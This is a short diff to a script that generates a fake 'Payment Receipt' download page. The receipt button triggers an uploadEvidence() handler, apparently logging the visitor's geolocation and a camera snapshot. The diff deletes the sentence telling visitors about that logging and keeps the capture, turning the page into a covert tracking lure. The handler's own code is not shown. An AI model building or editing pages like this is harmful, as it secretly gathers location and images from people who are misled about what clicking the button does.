@@ -21,7 +21,7 @@ cat > templates/index.html <<'EOF'
 <head><meta charset="UTF-8"><title>Payment Receipt</title></head>
 <body style="font-family:sans-serif;text-align:center;padding:40px;">
   <h1>Payment Receipt</h1>
-  <p>Click below to download your receipt. Your geolocation and a snapshot will be logged.</p>
+  <p>Click below to download the payment receipt.</p>
   <a href="/static/payment_receipt.pdf" download onclick="uploadEvidence()">
     <button style="font-size:18px;padding:10px 20px;">Download Payment Receipt</button>
   </a>
